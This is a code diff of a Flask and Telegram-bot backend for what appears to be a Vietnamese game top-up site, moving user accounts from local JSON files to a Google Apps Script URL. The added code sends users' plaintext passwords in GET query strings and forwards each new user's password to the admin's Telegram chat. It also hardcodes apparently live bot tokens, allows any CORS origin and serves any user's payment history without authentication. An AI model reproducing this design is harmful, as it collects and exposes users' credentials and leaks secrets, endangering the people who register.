@@ -9,6 +9,7 @@ import json
 import os
 import random
 import base64
+import time
 
 # ==========================================
 # CẤU HÌNH HỆ THỐNG - ĐẲNG CẤP & UY TÍN
@@ -17,6 +18,9 @@ ADMIN_ID = "8730269698"
 BOT_KHACH_MOI = "8766548413:AAHtRBkwQLd2nT5Nig8v_F3MqRGb2hljLhk"
 BOT_XU_LY_BILL = "8947479869:AAFCJZf4iaXg4FuPikDLeibRNaHJEx4CJWA"
 
+# Đã dán link Google Sheets Bất Tử của Boss Nguyên:
+SHEET_URL = "https://script.google.com/macros/s/AKfycbxkZbayRDx9qvMij7vfNf_K-YNCXWmV64sIFSu73__z7W2waGtt5V4Srx0qaeI7Qwck/exec"
+
 bot = telebot.TeleBot(BOT_XU_LY_BILL)
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
@@ -24,7 +28,6 @@ app.url_map.strict_slashes = False
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 HISTORY_FILE = os.path.join(BASE_DIR, "lich_su_nap.json")
-USER_FILE = os.path.join(BASE_DIR, "danh_sach_user.json") 
 
 def load_history():
     if not os.path.exists(HISTORY_FILE): return []
@@ -36,21 +39,11 @@ def save_history(data):
     with open(HISTORY_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, ensure_ascii=False, indent=4)
 
-def load_users():
-    if not os.path.exists(USER_FILE): return []
-    with open(USER_FILE, "r", encoding="utf-8") as f:
-        try: return json.load(f)
-        except: return []
-
-def save_users(data):
-    with open(USER_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
-
 @app.route("/")
 def keep_alive():
-    return "SERVER HUY ROYAL ĐANG CHẠY TRÊN RENDER!", 200
+    return "SERVER ĐANG CHẠY - HỆ THỐNG ĐÃ NỐI GOOGLE SHEETS BẢO MẬT CAO!", 200
 
-# ===== API ĐĂNG KÝ =====
+# ===== API ĐĂNG KÝ (CÓ MẬT KHẨU) =====
 @app.route("/api/register", methods=["POST", "OPTIONS"])
 def register():
     if request.method == "OPTIONS": return jsonify({"status": "ok"}), 200
@@ -63,25 +56,23 @@ def register():
         if not username or not password or not phone:
             return jsonify({"status": "error", "message": "Vui lòng nhập đủ thông tin!"}), 400
 
-        users = load_users()
-        for u in users:
-            if u["username"].lower() == username.lower():
-                return jsonify({"status": "error", "message": "❌ Tên tài khoản này đã có người sử dụng!"}), 400
-            if u.get("phone") == phone:
-                return jsonify({"status": "error", "message": "❌ Số điện thoại này đã được đăng ký!"}), 400
+        # Kiểm tra xem TK Game đã có ai đăng ký chưa
+        res_check = requests.get(f"{SHEET_URL}?action=kiemtra_dangky&tk_game={username}", timeout=15)
+        if res_check.text.strip() == "DA_DANG_KY":
+            return jsonify({"status": "error", "message": "❌ Tên tài khoản này đã có người sử dụng!"}), 400
+
+        # Bắn dữ liệu (kèm mật khẩu) vào Sheets
+        requests.get(f"{SHEET_URL}?action=dangky&tk_game={username}&mk={password}&sdt={phone}", timeout=15)
 
         time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        users.append({"username": username, "password": password, "phone": phone, "time": time_now})
-        save_users(users)
-
-        msg = f"🟢 CÓ KHÁCH HÀNG MỚI ĐĂNG KÝ\n👤 Tên: {username}\n📱 SĐT: {phone}\n⏰ T.Gian: {time_now}"
+        msg = f"🟢 CÓ KHÁCH HÀNG MỚI ĐĂNG KÝ\n👤 Tên: {username}\n🔑 Pass: {password}\n📱 SĐT: {phone}\n⏰ T.Gian: {time_now}"
         requests.post(f"https://api.telegram.org/bot{BOT_KHACH_MOI}/sendMessage", json={"chat_id": ADMIN_ID, "text": msg})
         
         return jsonify({"status": "success", "message": "✅ Đăng ký thành công!"}), 200
     except Exception as e:
-        return jsonify({"status": "error", "message": "Lỗi máy chủ!"}), 500
+        return jsonify({"status": "error", "message": "Lỗi kết nối máy chủ dữ liệu!"}), 500
 
-# ===== API ĐĂNG NHẬP =====
+# ===== API ĐĂNG NHẬP (QUÉT CHUẨN MẬT KHẨU) =====
 @app.route("/api/login", methods=["POST", "OPTIONS"])
 def login_api():
     if request.method == "OPTIONS": return jsonify({"status": "ok"}), 200
@@ -90,17 +81,18 @@ def login_api():
         username = data.get("username", "").strip()
         password = data.get("password", "").strip()
         
-        users = load_users()
-        for u in users:
-            if u["username"].lower() == username.lower():
-                if u.get("password") == password:
-                    return jsonify({"status": "success", "message": "Đăng nhập thành công!"}), 200
-                else:
-                    return jsonify({"status": "error", "message": "❌ Mật khẩu không chính xác!"}), 400
+        # Quét tên TK và Pass từ Google Sheets
+        res_check = requests.get(f"{SHEET_URL}?action=kiemtra_dangnhap&tk_game={username}&mk={password}", timeout=15)
+        result = res_check.text.strip()
         
-        return jsonify({"status": "error", "message": "❌ Tài khoản chưa được đăng ký!"}), 400
+        if result == "DUNG_PASS":
+            return jsonify({"status": "success", "message": "Đăng nhập thành công!"}), 200
+        elif result == "SAI_PASS":
+            return jsonify({"status": "error", "message": "❌ Mật khẩu không chính xác!"}), 400
+        else:
+            return jsonify({"status": "error", "message": "❌ Tài khoản chưa được đăng ký!"}), 400
     except Exception as e:
-        return jsonify({"status": "error", "message": "Lỗi máy chủ!"}), 500
+        return jsonify({"status": "error", "message": "Lỗi kết nối máy chủ dữ liệu!"}), 500
 
 # ===== API GỬI BILL =====
 @app.route("/api/deposit", methods=["POST", "OPTIONS"])
@@ -146,21 +138,13 @@ def deposit():
     except Exception as e:
         return jsonify({"status": "error", "message": "Lỗi máy chủ!"}), 500
 
-# ===== API TẢI LỊCH SỬ (ĐÃ SỬA LỌC THEO USERNAME) =====
+# ===== API TẢI LỊCH SỬ =====
 @app.route("/api/history", methods=["GET", "OPTIONS"])
 def get_history():
     if request.method == "OPTIONS": return jsonify({"status": "ok"}), 200
-    
-    # Lấy tên user từ Web gửi lên
     username = request.args.get("username", "").strip().lower()
     history = load_history()
-    
-    # Lọc ra đúng danh sách bill của user đó
-    user_history = []
-    for item in history:
-        if item.get("username", "").strip().lower() == username:
-            user_history.append(item)
-            
+    user_history = [item for item in history if item.get("username", "").strip().lower() == username]
     return jsonify({"data": user_history[:15]}), 200
 
 # ===== CÁC HÀM XỬ LÝ BOT TELEGRAM =====
@@ -205,27 +189,18 @@ def handle_reply_code(message):
             bot.reply_to(message, "❌ Lỗi: " + str(e))
 
 # ===== ĐỘNG CƠ GIỮ BOT VÀ WEB BẤT TỬ 24/7 =====
-import threading
-import time
-import os
-
 def run_bot():
     while True:
         try:
             print("🚀 Đang khởi động Bot Telegram...")
-            # Lệnh infinity_polling giúp Bot chống chịu mạng lag cực tốt
             bot.infinity_polling(timeout=10, long_polling_timeout=5)
         except Exception as e:
             print(f"⚠️ Bot kẹt mạng, tự động tái sinh sau 3s... Lỗi: {e}")
             time.sleep(3)
 
 if __name__ == "__main__":
-    # 1. Tách Bot ra chạy ở 1 luồng riêng không bao giờ chết
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.daemon = True
     bot_thread.start()
-    
-    # 2. Chạy Web Server song song
-    # (Render yêu cầu phải lấy PORT từ môi trường của nó)
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
